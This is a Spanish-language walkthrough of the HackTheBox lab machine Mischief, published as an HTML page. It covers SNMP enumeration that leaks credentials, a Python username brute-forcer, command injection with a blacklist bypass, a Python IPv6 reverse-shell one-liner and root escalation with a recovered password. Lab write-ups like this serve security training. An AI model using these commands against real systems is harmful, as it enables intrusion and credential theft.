@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Mischief HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mischief.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Mischief HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Mischief de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Mischief de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Mischief HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Mischief HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Mischief de la plataforma de HackTheBox","headline":"Writeup Mischief HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Mischief HackTheBox</h1>
+          <p>Resolución de la máquina Mischief de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, con -sV para ver versiones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sV 10.10.10.92
+Nmap scan report for 10.10.10.92
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+3366/tcp open  caldav  Radicale calendar (Python BaseHTTPServer)</span>
+</code></pre></div></div>
+
+<div><p>Para ssh no tenemos credenciales y para el puerto 3366 que es una web tampoco</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Como alternativa al escanear puertos por UDP podemos encontrar el 161, snmp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo nmap</span><span class="p"> -sU -T5 --open --top-ports 100 10.10.10.92
+Nmap scan report for 10.10.10.92
+PORT    STATE SERVICE
+161/udp open  snmp</span>
+</code></pre></div></div>
+
+<div><p>Es recomendable instalar esta utilidad/extensión para ver mejor las cosas con snmpwalk</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo apt</span><span class="p"> install snmp-mibs-downloader</span>
+</code></pre></div></div>
+
+<div><p>Podemos empezar listando con una community string comun como public, algunos procesos, en especial nos interesa python ya que la web con eso corre, encontramos el proceso 805</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ snmpbulkwalk </span><span class="p">-v2c -c public 10.10.10.92 hrSWRunTable | </span><span class="s2">grep</span><span class="p"> python
+HOST-RESOURCES-MIB::hrSWRunName.805 = STRING: "python"
+HOST-RESOURCES-MIB::hrSWRunPath.685 = STRING: "/usr/bin/python3"
+HOST-RESOURCES-MIB::hrSWRunPath.</span><span class="kd">805</span><span class="p"> = STRING: "python"</span>
+</code></pre></div></div>
+
+<div><p>Al grepear el proceso 805, en una linea encontramos credenciales de loki, loki : godofmischiefisloki</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ snmpbulkwalk</span><span class="p"> -v2c -c public 10.10.10.92 hrSWRunTable | </span><span class="s2">grep</span><span class="p"> 805
+HOST-RESOURCES-MIB::hrSWRunIndex.805 = INTEGER: 805
+HOST-RESOURCES-MIB::hrSWRunName.805 = STRING: "python"
+HOST-RESOURCES-MIB::hrSWRunID.805 = OID: SNMPv2-SMI::zeroDotZero
+HOST-RESOURCES-MIB::hrSWRunPath.805 = STRING: "python"
+HOST-RESOURCES-MIB::hrSWRunParameters.805 = STRING: "-m SimpleHTTPAuthServer 3366 </span><span class="na">loki</span><span class="p">:</span><span class="kd">godofmischiefisloki</span><span class="p"> --dir /home/loki/hosted/"
+HOST-RESOURCES-MIB::hrSWRunType.805 = INTEGER: application(4)
+HOST-RESOURCES-MIB::hrSWRunStatus.805 = INTEGER: runnable(2)</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar estas credenciales de loki para autenticarnos en la web del puerto 3366</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al autenticarnos se nos muestra una tablas con 2 posibles contraseñas para el usuario loki</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>En snmp ademas de listar procesos podemos intentar listar las ip, tanto ipv4 como ipv6</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ snmpbulkwalk </span><span class="p">-v2c -c public 10.10.10.92 ipAddressType
+IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv4."10.10.255.255" = INTEGER: broadcast(3)
+IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:96:4e:3f" = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:96:4e:3f" = INTEGER: unicast(1)</span>
+</code></pre></div></div>
+
+<div><p>Nos quedamos con la direccion y le damos forma haciendolo en grupos de 4 caracteres</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:96:4e:3f
+
+dead:beef:0000:0000:0250:56ff:fe96:4e3f</span>
+</code></pre></div></div>
+
+<div><p>Las partes de los 0 podemos quitarlas para que quede un poco mas pequeña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">dead:beef:0000:0000:0250:56ff:fe96:4e3f
+
+dead:beef::250:56ff:fe96:4e3f</span>
+</code></pre></div></div>
+
+<div><p>Ya que puede que haya puertos diferentes por ipv6 podemos escanearlos con nmap, vemos el 80</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -6 dead:beef::250:56ff:fe96:4e3f
+Nmap scan report for dead:beef::250:56ff:fe96:4e3f
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Podemos acceder desde el navegador con [], el botón azul gigante nos redirige a un login</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Tenemos un panel de autenticación, pero no tenemos credenciales, las de loki no funcionan</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Esperando que alguna de las contraseñas que nos dio el puerto 3366 sea valida podemos intentar fuzzear el usuario con un diccionario, para esto creamos un script como el siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">requests
+
+passwords </span><span class="kd">=</span><span class="p"> [</span><span class="s2">"godofmischiefisloki"</span><span class="p">,</span><span class="s2"> "trickeryanddeceit"</span><span class="p">]
+
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">""</span><span class="p">)
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"</span><span class="p">)</span><span class="kd"> as</span><span class="p"> file:
+    </span><span class="kd">for </span><span class="p">line </span><span class="kd">in </span><span class="p">file:
+        username </span><span class="kd">= </span><span class="p">line.strip()
+        </span><span class="kd">for </span><span class="p">password </span><span class="kd">in </span><span class="p">passwords:
+             target </span><span class="kd">=</span><span class="s2"> "http://[dead:beef::250:56ff:fe96:4e3f]/login.php"</span><span class="p">
+             data </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"user"</span><span class="p">: username, </span><span class="s2">"password"</span><span class="p">: password}
+             bar.status(</span><span class="k">f</span><span class="s2">"Probando credenciales: {username}:{password}"</span><span class="p">)
+             request </span><span class="kd">=</span><span class="p"> requests.post(target, </span><span class="no">data</span><span class="kd">=</span><span class="p">data)
+
+             </span><span class="kd">if </span><span class="s2">"Sorry, those credentials do not match"</span><span class="kd"> not in </span><span class="p">request.text:
+                 bar.success(</span><span class="k">f</span><span class="s2">"Credenciales válidas: {username}:{password}"</span><span class="p">)</span><span class="p">
+                 exit(</span><span class="na">0</span><span class="p">)
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo, empezara a probar usuarios con las contraseñas hasta que encuentre unas validas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py 
+[</span><span class="na">◢</span><span class="p">] Probando credenciales: michael:godofmischiefisloki</span>
+</code></pre></div></div>
+
+<div><p>Despues de un rato encuentra que administrator es valido con la segunda contraseña en el login</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="s2">+</span><span class="p">] Credenciales válidas: administrator:trickeryanddeceit</span>
+</code></pre></div></div>
+
+<div><p>Usamos las credenciales que encontramos en el login de la web por ipv6</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Al iniciar sesión nos muestra una 'consola', donde por defecto ejecutamos 2 ping al localhost</p></div>
+<a href="./7.png" target="_blank"><div><p><img src="./7.png"><p></div></a>
+
+<div><p>Podemos ejecutar otro comando como id y ver el output con ; al final, lo ejecuta www-data</p></div>
+<a href="./8.png" target="_blank"><div><p><img src="./8.png"><p></div></a>
+
+<div><p>Importante poner atencion al mensaje que tiene la web, en su directorio home, un usuario tiene un archivo llamado credentials con su contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">In my home directory, i have my password in a file called credentials, Mr Admin</span>
+</code></pre></div></div>
+
+<div><p>Al intentar leerlo parece que credentials nos dice command is not allowed y no no los muestra</p></div>
+<a href="./9.png" target="_blank"><div><p><img src="./9.png"><p></div></a>
+
+<div><p>Tal vez credentials esta en una blacklist pero podemos usar wildcard para enfocar todo archivo</p></div>
+<a href="./10.png" target="_blank"><div><p><img src="./10.png"><p></div></a>
+
+<div><p>Con esa contraseña nos podemos conectar por ssh, pero ojo que no es la idea de la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">loki@10.10.10.92
+loki@10.10.10.92's password: </span><span class="kd">lokiisthebestnorsegod</span><span class="p">
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(loki) gid=1004(loki) groups=1004(loki)
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Volviendo a la web con la idea principal, esta sanitizado el hecho de enviar reverse shells por ipv4, pero... no por ipv6, podemos ver nuestra direccion con ifconfig</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ifconfig </span><span class="p">tun0 | </span><span class="s2">grep </span><span class="p">dead
+        inet6 </span><span class="kd">dead:beef:2::1007</span><span class="p">  prefixlen 64  scopeid 0x0&ltglobal></span>
+</code></pre></div></div>
+
+<div><p>Nos ponemos en escucha con netcat importante indicando la direccion ipv6</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -vn -l dead:beef:2::1007 443
+Listening on dead:beef:2::1007 443</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar python para hacernos una reverse shell por ipv6 con un oneliner como el siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1007",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<div><p>Enviamos nuestro comando y en el listener recibimos una shell como www-data</p></div>
+<a href="./11.png" target="_blank"><div><p><img src="./11.png"><p></div></a>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-vn -l dead:beef:2::1007 443
+Listening on dead:beef:2::1007 443
+Connection received on dead:beef::250:56ff:fe96:4e3f
+$ script /dev/null -c bash
+</span><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:4e3f 
+</span><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos leer el archivo credentials en el home de loki, aunque ya lo habiamos leido</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">/home/loki</span><span class="p">$ cat credentials 
+pass: </span><span class="kd">lokiisthebestnorsegod</span><span class="p">
+</span><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">/home/loki</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar como loki con la contraseña por ssh y leer la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">loki@10.10.10.92
+loki@10.10.10.92's password: </span><span class="kd">lokiisthebestnorsegod
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(loki) gid=1004(loki) groups=1004(loki)
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:4e3f 
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+bf5**************************060
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el .bash_history de loki podemos ver una autenticacion con una contraseña diferente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat .bash_history 
+python -m SimpleHTTPAuthServer loki:</span><span class="kd">lokipasswordmischieftrickery</span><span class="p">
+exit
+free -mt
+ifconfig
+cd /etc/
+sudo su
+su
+exit
+su root
+ls -la
+sudo -l
+ifconfig
+id
+cat .bash_history 
+nano .bash_history 
+exit
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Puede ser que la contraseña de root pero al hacer un su root nos dice permiso denegado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ su root
+-bash: /bin/su: Permission denied
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando los privilegios con getfacl podemos ver que loki solo tiene permiso de lectura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ getfacl /bin/su
+getfacl: Removing leading '/' from absolute path names
+# file: bin/su
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:</span><span class="kd">r--</span><span class="p">
+group::r-x
+mask::r-x
+other::r-x
+</span><span class="s2">loki@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>"Otros" pueden ejecutar asi que como www-data nos convertimos en root y leemos la flag ... o no?</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">$ su root
+Password: </span><span class="kd">lokipasswordmischieftrickery</span><span class="p">
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.10.92 dead:beef::250:56ff:fe96:4e3f 
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+The flag is not here, get a shell to find it!
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>La flag tiene el mismo nombre pero en otro lugar, asi que la encontramos con find y la leemos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p"># find / -name root.txt 2>/dev/null
+</span><span class="kd">/usr/lib/gcc/x86_64-linux-gnu/7/root.txt</span><span class="p">
+/root/root.txt
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ae1**************************807
+</span><span class="s2">root@Mischief</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
